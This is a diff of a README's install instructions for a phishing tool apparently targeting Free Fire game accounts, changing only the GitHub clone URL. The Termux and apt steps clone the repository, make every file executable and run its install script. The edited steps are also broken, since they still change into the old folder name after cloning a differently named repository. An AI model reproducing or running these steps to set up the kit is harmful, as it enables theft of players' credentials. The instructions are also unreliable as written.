@@ -61,7 +61,7 @@ This format incorporates the additional details while keeping the original struc
 pkg update -y
 pkg upgrade -y
 pkg install git 
-git clone https://github.com/CYB3RKING/FreeFire-Phishing
+git clone https://github.com/HandTy/FFP
 cd FreeFire-Phishing
 chmod +x *
 bash install
@@ -71,7 +71,7 @@ bash install
 sudo apt update -y
 sudo apt upgrade -y
 sudo apt install git 
-git clone  https://github.com/CYB3RKING/FreeFire-Phishing
+git clone  https://github.com/HandTy/FFP
 cd FreeFire-Phishing
 chmod +x *
 bash install 
